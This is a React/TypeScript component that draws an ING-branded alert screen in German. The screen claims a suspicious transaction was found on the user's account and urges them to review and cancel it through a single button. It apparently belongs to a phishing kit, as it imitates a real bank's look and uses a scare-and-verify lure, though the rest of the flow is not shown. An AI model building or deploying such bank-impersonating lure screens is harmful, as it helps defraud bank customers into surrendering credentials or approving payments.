import React from 'react';

interface AlertScreenProps {
  onConfirm: () => void;
}

const AlertScreen: React.FC<AlertScreenProps> = ({ onConfirm }) => {
  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '60vh',
      padding: '40px 20px'
    }}>
      <div className="ing-card" style={{ 
        padding: '40px',
        textAlign: 'center',
        maxWidth: '600px',
        width: '100%'
      }}>
        <div style={{
          marginBottom: '24px'
        }}>
          <div style={{
            width: '80px',
            height: '80px',
            margin: '0 auto 20px',
            background: '#e30613',
            borderRadius: '50%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="white">
              <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
            </svg>
          </div>
        </div>
        
        <h2 style={{
          fontSize: '28px',
          fontWeight: 'bold',
          color: '#333',
          marginBottom: '20px',
          fontFamily: 'ING Me, Arial, sans-serif'
        }}>
          Verdächtige Transaktion erkannt
        </h2>
        
        <p style={{
          fontSize: '16px',
          color: '#666',
          lineHeight: '1.5',
          marginBottom: '30px',
          fontFamily: 'ING Me, Arial, sans-serif'
        }}>
          Wir haben eine verdächtige Transaktion auf Ihrem Konto festgestellt. 
          Um Ihr Konto zu schützen, müssen Sie diese Transaktion überprüfen und bestätigen, 
          ob Sie diese stornieren möchten.
        </p>
        
        <button 
          className="button button--primary" 
          onClick={onConfirm}
          style={{ width: '100%', maxWidth: '300px' }}
        >
          Transaktion überprüfen und stornieren
        </button>
      </div>
    </div>
  );
};

export default AlertScreen;
